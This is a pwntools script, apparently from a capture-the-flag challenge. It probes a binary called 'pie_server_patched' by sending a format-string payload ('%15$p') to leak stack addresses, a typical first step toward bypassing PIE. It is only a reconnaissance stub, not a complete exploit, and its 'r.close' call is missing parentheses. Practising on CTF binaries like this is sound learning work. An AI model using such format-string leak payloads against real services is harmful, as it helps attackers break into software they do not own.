#!/usr/bin/env python3

from pwn import *

exe = ELF("./pie_server_patched")

context.binary = exe

gdbscript = '''
init-pwndbg
piebase
'''.format(**locals())

def conn():
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        return gdb.debug([exe.path], gdbscript=gdbscript)
    else:
        r = remote("addr", 1337)

    return r


def main():

    context.log_level = 'warning'

    # good luck pwning :)

    for i in range(15,16):
     try:
        r = conn()
        r.sendlineafter(b':', '%{}$p'.format(i).encode())
        r.recvuntil(b'Hello ')
        result = r.recvline()
        print(str(i) + ': ' + str(result))
        r.close
     except EOFError:
        pass

if __name__ == "__main__":
    main()
